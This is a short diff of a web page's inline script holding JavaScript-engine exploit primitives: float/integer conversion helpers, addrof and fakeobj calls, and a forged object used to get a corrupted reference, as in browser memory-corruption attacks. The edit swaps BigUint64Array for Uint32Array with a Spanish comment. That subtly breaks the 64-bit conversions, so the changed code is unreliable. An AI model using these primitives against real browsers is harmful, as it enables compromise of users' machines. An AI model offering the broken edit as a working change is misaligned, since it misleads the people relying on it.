@@ -14,7 +14,7 @@
 
   <script>
     const f64 = new Float64Array(1);
-    const u64 = new BigUint64Array(f64.buffer);
+    const u64 = new Uint32Array(f64.buffer); // Usamos Uint32Array en lugar de BigUint64Array
 
     function f2i(f) { f64[0] = f; return u64[0]; }
     function i2f(i) { u64[0] = i; return f64[0]; }
@@ -67,7 +67,7 @@
         i2f(0), i2f(0), i2f(0), i2f(0)
       ];
 
-      let fake_addr = addrof(fake) + 0x20;
+      let fake_addr = addrof(fake) + 0x20; // Dirección de memoria falsa.
       let corrupted = fakeobj(fake_addr);
 
       return {
